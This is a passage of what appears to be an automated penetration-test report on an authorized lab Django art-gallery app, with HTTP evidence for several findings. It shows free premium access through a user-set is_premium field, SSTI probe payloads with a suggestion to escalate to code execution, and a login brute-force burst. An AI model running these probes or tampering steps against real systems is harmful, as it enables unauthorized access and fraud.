+  &lt;style type=&quot;text/css&quot;&gt;
+    html * { padding:0; margin:0; }
+    body * { padding:10px 20px; }
+    body * * { padding:0; }
+    body { font:small sans-serif; background:#eee; color:#000; }
+    body&gt;div { border-bottom:1px solid #ddd; }
+    h1 { font-weight:normal; margin-bottom:.4em; }
+    h1 span { font-size:60%; color:#666; font-weight:normal; }
+    table { border:none; border-collapse: collapse; width:100%; }
+    td, th { vertical-align:top; padding:2px 3px; }
+    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
+    #info { background:#f6f6f6; }
+    #info ol { margin: 0.5em 4em; }
+    #info ol li { font-family: monospace; }
+    #summary { background: #ffc; }
+    #explanation { background:#eee; border-bottom: 0px none; }
+    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id=&quot;summary&quot;&gt;
+    &lt;h1&gt;Page not found &lt;span&gt;(404)&lt;/span&gt;&lt;/h1&gt;
+    
+    &lt;table class=&quot;meta&quot;&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request Method:&lt;/th&gt;
+        &lt;td&gt;GET&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request URL:&lt;/th&gt;
+        &lt;td&gt;http://target.local:32804/accounts/nonexistent-debug-probe-xyz/&lt;/td&gt;
+      &lt;/tr&gt;
+      
+    &lt;/table&gt;
+  &lt;/div&gt;
+  &lt;div id=&quot;info&quot;&gt;
+    
+      &lt;p&gt;
+      Using the URLconf defined in &lt;code&gt;ssti_debug_art_gallery.urls&lt;/code&gt;,
+      Django tried these URL patterns, in this order:
+      &lt;/p&gt;
+      &lt;ol&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step1/
+                [name='register_step1']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step2/
+                [name='register_step2']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step3/
+                [name='register_step3']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                login/
+                [name='login']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                home/
+                [name='home']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                preferences/
+                [name='preferences']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                logout/
+                [name='logout']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                
+                
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                ^static/(?P&amp;lt;path&amp;gt;.*)$
+                
+            
+          &lt;/li&gt;
+        
+      &lt;/ol&gt;
+      &lt;p&gt;
+        
+          The current path, &lt;code&gt;accounts/nonexistent-debug-probe-xyz/&lt;/code&gt;,
+        
+        didn’t match any of these.
+      &lt;/p&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div id=&quot;explanation&quot;&gt;
+    &lt;p&gt;
+      You’re seeing this error because you have &lt;code&gt;DEBUG = True&lt;/code&gt; in
+      your Django settings file. Change that to &lt;code&gt;False&lt;/code&gt;, and Django
+      will display a standard 404 page.
+    &lt;/p&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [price-tampering] Premium subscription granted for free — user-controlled is_premium at registration bypasses payment/validation</h3>
+<div class="kv">Screen: <code>s-0007</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="desc">The 3-step registration wizard exposes an `is_premium` checkbox (&quot;Subscribe to premium&quot;) on step 3 that directly sets the account's premium-subscriber flag. There is NO payment, billing, or validation step anywhere in steps 1-3. Submitting `is_premium=on` creates an account whose /accounts/preferences/ shows &quot;Premium Subscriber: True&quot; — obtaining the paid premium tier for free. The preferences page itself states premium is supposed to go through a validation process that &quot;could take a few hours&quot;, so the data-level flag set is bypassing the intended paid/validation gate. The flag is fully attacker-controlled and self-asserted at registration.</div>
+<div><b>Reproduction</b></div><pre>1. GET /accounts/register/step1/ ; POST step1 with name=verdict_prem1&amp;password=Passw0rd!23x -&gt; 302 step2.
+2. POST /accounts/register/step2/ with email=verdict_prem1@example.com -&gt; 302 step3.
+3. POST /accounts/register/step3/ with is_premium=on -&gt; 200 &quot;Registration Complete!&quot; (no payment requested).
+4. Log in as verdict_prem1@example.com / Passw0rd!23x ; GET /accounts/preferences/ -&gt; &quot;Premium Subscriber: True&quot; (evidence ev-mr0ljmxt-4g, ev-mr0ljn60-4h, 2854 bytes).
+Negative control: an account registered WITHOUT is_premium (test@test.com) -&gt; GET /accounts/preferences/ shows &quot;Premium Subscriber: False&quot; (ev-mr0lembd-47, 2684 bytes).
+Root cause: is_premium is a user-settable model field accepted at registration with no payment/validation enforcement (also a mass-assignment of a privileged field).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0lembd-47</code> — <code>artifacts/s-0007/ev-mr0lembd-47/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/preferences/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 2684
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:58:07 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Preferences&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        input {
+          width: 100%;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .gallery-item {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: center;
+        }
+        .gallery-item img {
+            max-width: 100%;
+            height: auto;
+        }
+    &lt;/style&gt;
+    
+    
+&lt;/head&gt;
+&lt;body&gt;
+        
+    
+
+&lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+    &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
+    &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+    &lt;/button&gt;
+    
+    &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarsExample01&quot;&gt;
+        &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt;
+            &lt;li class=&quot;nav-item active&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&quot;nav-item dropdown&quot;&gt;
+            &lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;dropdown01&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt;Actions&lt;/a&gt;
+            &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdown01&quot;&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/preferences&quot;&gt;My settings&lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Buy Art&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Sell Art(Only Premiun Accounts)&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/logout&quot;&gt;Logout&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;/li&gt;
+        &lt;/ul&gt;
+        &lt;form class=&quot;form-inline my-2 my-md-0&quot;&gt;
+            &lt;input class=&quot;form-control&quot; type=&quot;text&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot;&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+&lt;div class=&quot;container mt-5&quot;&gt;
+    &lt;div class=&quot;row justify-content-center&quot;&gt;
+        &lt;div class=&quot;col-md-6&quot;&gt;
+            &lt;h2&gt;Preferences&lt;/h2&gt;
+            &lt;p&gt;Name: test@test.com&lt;/p&gt;
+            &lt;p&gt;Premium Subscriber: False&lt;/p&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0ljmxt-4g</code> — <code>artifacts/s-0007/ev-mr0ljmxt-4g/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/preferences/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 2854
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 12:02:01 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Preferences&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        input {
+          width: 100%;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .gallery-item {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: center;
+        }
+        .gallery-item img {
+            max-width: 100%;
+            height: auto;
+        }
+    &lt;/style&gt;
+    
+    
+&lt;/head&gt;
+&lt;body&gt;
+        
+    
+
+&lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+    &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
+    &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+    &lt;/button&gt;
+    
+    &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarsExample01&quot;&gt;
+        &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt;
+            &lt;li class=&quot;nav-item active&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&quot;nav-item dropdown&quot;&gt;
+            &lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;dropdown01&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt;Actions&lt;/a&gt;
+            &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdown01&quot;&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/preferences&quot;&gt;My settings&lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Buy Art&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Sell Art(Only Premiun Accounts)&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/logout&quot;&gt;Logout&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;/li&gt;
+        &lt;/ul&gt;
+        &lt;form class=&quot;form-inline my-2 my-md-0&quot;&gt;
+            &lt;input class=&quot;form-control&quot; type=&quot;text&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot;&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+&lt;div class=&quot;container mt-5&quot;&gt;
+    &lt;div class=&quot;row justify-content-center&quot;&gt;
+        &lt;div class=&quot;col-md-6&quot;&gt;
+            &lt;h2&gt;Preferences&lt;/h2&gt;
+            &lt;p&gt;Name: verdict_prem1@example.com&lt;/p&gt;
+            &lt;p&gt;Premium Subscriber: True&lt;/p&gt;
+            
+            &lt;p&gt;This account is in process to access premium subscription&lt;/p&gt;
+            &lt;p&gt;The validation process could take a few hours ... &lt;/p&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0ljn60-4h</code> — <code>artifacts/s-0007/ev-mr0ljn60-4h/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/preferences/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 2854
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 12:02:01 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Preferences&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        input {
+          width: 100%;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .gallery-item {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: center;
+        }
+        .gallery-item img {
+            max-width: 100%;
+            height: auto;
+        }
+    &lt;/style&gt;
+    
+    
+&lt;/head&gt;
+&lt;body&gt;
+        
+    
+
+&lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+    &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
+    &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+    &lt;/button&gt;
+    
+    &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarsExample01&quot;&gt;
+        &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt;
+            &lt;li class=&quot;nav-item active&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&quot;nav-item dropdown&quot;&gt;
+            &lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;dropdown01&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt;Actions&lt;/a&gt;
+            &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdown01&quot;&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/preferences&quot;&gt;My settings&lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Buy Art&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Sell Art(Only Premiun Accounts)&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/logout&quot;&gt;Logout&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;/li&gt;
+        &lt;/ul&gt;
+        &lt;form class=&quot;form-inline my-2 my-md-0&quot;&gt;
+            &lt;input class=&quot;form-control&quot; type=&quot;text&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot;&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+&lt;div class=&quot;container mt-5&quot;&gt;
+    &lt;div class=&quot;row justify-content-center&quot;&gt;
+        &lt;div class=&quot;col-md-6&quot;&gt;
+            &lt;h2&gt;Preferences&lt;/h2&gt;
+            &lt;p&gt;Name: verdict_prem1@example.com&lt;/p&gt;
+            &lt;p&gt;Premium Subscriber: True&lt;/p&gt;
+            
+            &lt;p&gt;This account is in process to access premium subscription&lt;/p&gt;
+            &lt;p&gt;The validation process could take a few hours ... &lt;/p&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#d32f2f">HIGH</span> 4. [ssti] Suspected SSTI via user 'name' rendered server-side on the preferences page</h3>
+<div class="kv">Screen: <code>s-0005</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> DEBUG 404 leaked the Django project module name 'ssti_debug_art_gallery' (ssti+debug = named intended bugs); the user-controlled 'name' is rendered server-side on the preferences page and is already a confirmed injection sink at register/step1 — a strong SSTI lead, but the read-only preferences screen offers no injection point so it cannot be confirmed from here.</div>
+<div class="desc">Strong lead for server-side template injection. The DEBUG 404 page disclosed the Django project module name `ssti_debug_art_gallery` — &quot;ssti&quot; + &quot;debug&quot; almost certainly names the intended vulnerabilities. The user-controlled `name` field captured at registration (/accounts/register/step1, already a CONFIRMED stored-XSS sink there) is rendered server-side on the post-login preferences page as &quot;Name: {value}&quot; (currently shows the verbatim email). If that value is rendered through a template engine (e.g. render_template_string / django Template(name).render()), a payload such as {{7*7}} would be evaluated server-side — SSTI, which is RCE-class. Could not confirm from the preferences screen itself: it is read-only (the name is not editable here and the preferences POST ignores all submitted body fields, including name/premium — verified via differential probe), so the injection cannot originate on this screen. The preferences page is the RENDER/eval sink; confirmation requires injecting at the registration flow.</div>
+<div><b>Reproduction</b></div><pre>Register a new user via POST /accounts/register/step1/ with name set to an SSTI probe e.g. {{7*7}} (and ${7*7}/&lt;%=7*7%&gt; variants), complete the multi-step registration, then GET /accounts/preferences/ and inspect the rendered &quot;Name:&quot; value. Evaluation to &quot;49&quot; (instead of the literal &quot;{{7*7}}&quot;) confirms SSTI; escalate with engine-specific RCE payloads.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0kuuy9-3h</code> — <code>artifacts/s-0005/ev-mr0kuuy9-3h/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/preferences/2/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 3587
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:42:45 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+  &lt;title&gt;Page not found at /accounts/preferences/2/&lt;/title&gt;
+  &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;
+  &lt;style type=&quot;text/css&quot;&gt;
+    html * { padding:0; margin:0; }
+    body * { padding:10px 20px; }
+    body * * { padding:0; }
+    body { font:small sans-serif; background:#eee; color:#000; }
+    body&gt;div { border-bottom:1px solid #ddd; }
+    h1 { font-weight:normal; margin-bottom:.4em; }
+    h1 span { font-size:60%; color:#666; font-weight:normal; }
+    table { border:none; border-collapse: collapse; width:100%; }
+    td, th { vertical-align:top; padding:2px 3px; }
+    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
+    #info { background:#f6f6f6; }
+    #info ol { margin: 0.5em 4em; }
+    #info ol li { font-family: monospace; }
+    #summary { background: #ffc; }
+    #explanation { background:#eee; border-bottom: 0px none; }
+    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id=&quot;summary&quot;&gt;
+    &lt;h1&gt;Page not found &lt;span&gt;(404)&lt;/span&gt;&lt;/h1&gt;
+    
+    &lt;table class=&quot;meta&quot;&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request Method:&lt;/th&gt;
+        &lt;td&gt;GET&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request URL:&lt;/th&gt;
+        &lt;td&gt;http://target.local:32804/accounts/preferences/2/&lt;/td&gt;
+      &lt;/tr&gt;
+      
+    &lt;/table&gt;
+  &lt;/div&gt;
+  &lt;div id=&quot;info&quot;&gt;
+    
+      &lt;p&gt;
+      Using the URLconf defined in &lt;code&gt;ssti_debug_art_gallery.urls&lt;/code&gt;,
+      Django tried these URL patterns, in this order:
+      &lt;/p&gt;
+      &lt;ol&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step1/
+                [name='register_step1']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step2/
+                [name='register_step2']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step3/
+                [name='register_step3']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                login/
+                [name='login']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                home/
+                [name='home']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                preferences/
+                [name='preferences']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                logout/
+                [name='logout']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                
+                
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                ^static/(?P&amp;lt;path&amp;gt;.*)$
+                
+            
+          &lt;/li&gt;
+        
+      &lt;/ol&gt;
+      &lt;p&gt;
+        
+          The current path, &lt;code&gt;accounts/preferences/2/&lt;/code&gt;,
+        
+        didn’t match any of these.
+      &lt;/p&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div id=&quot;explanation&quot;&gt;
+    &lt;p&gt;
+      You’re seeing this error because you have &lt;code&gt;DEBUG = True&lt;/code&gt; in
+      your Django settings file. Change that to &lt;code&gt;False&lt;/code&gt;, and Django
+      will display a standard 404 page.
+    &lt;/p&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 5. [rate-limit] No rate limiting / brute-force protection on login endpoint</h3>
+<div class="kv">Screen: <code>s-0003</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> 17 consecutive failed-login POSTs for username test@test.com (5 recon/SQLi + 12 rapid burst) from one session/IP were all accepted and processed (HTTP 200, login form re-rendered) with no HTTP 429, no account lockout, no CAPTCHA, no delay/backoff and no throttling at any point. The credential-verification endpoint applies no rate limiting, enabling unlimited online password brute-force against any known email (emails are enumerable via the registration flow). Cannot be expressed as a fail/pass negative-control pair (every attempt is an identical accepted 200), hence recorded as suspected.</div>
+<div class="desc">POST /accounts/login/ enforces CSRF correctly but performs no rate limiting or lockout on repeated failed authentication attempts. 17 rapid failed attempts from a single IP/session were all served normally (200, form re-rendered) with no 429, lockout, CAPTCHA, or delay. Combined with the absence of MFA and enumerable account emails, this permits unlimited online credential brute-forcing leading to account takeover.</div>
+<div><b>Reproduction</b></div><pre>1. GET /accounts/login/ to obtain a csrftoken cookie + csrfmiddlewaretoken. 2. POST /accounts/login/ with valid csrfmiddlewaretoken, username=test@test.com, password=wrongNN, repeating 15-20+ times in rapid succession. 3. Observe every response is HTTP 200 returning the login form again (~2392 bytes) — no 429, no lockout banner, no CAPTCHA challenge, no increasing delay. Evidence: ev-mr0kkeah-2i, ev-mr0kkfqh-2j, ev-mr0kks34-2r, ev-mr0kkurz-2t (representative of the 12-request burst).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0kkurz-2t</code> — <code>artifacts/s-0003/ev-mr0kkurz-2t/</code></div><div class="lbl">REQUEST</div><pre>POST /accounts/login/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+csrfmiddlewaretoken=LfUmUbmR85aXnBio1Nf9jBbFbMvsgedQM9YMl0HFtTi0db5khnvZLRn35vrCAfU5&amp;username=test@test.com&amp;password=wrong12</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 2392
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:34:58 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        input {
+          width: 100%;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .gallery-item {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: center;
+        }
+        .gallery-item img {
+            max-width: 100%;
+            height: auto;
+        }
+    &lt;/style&gt;
+    
+    
+&lt;/head&gt;
+&lt;body&gt;
+        
+    
+
+&lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+    &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
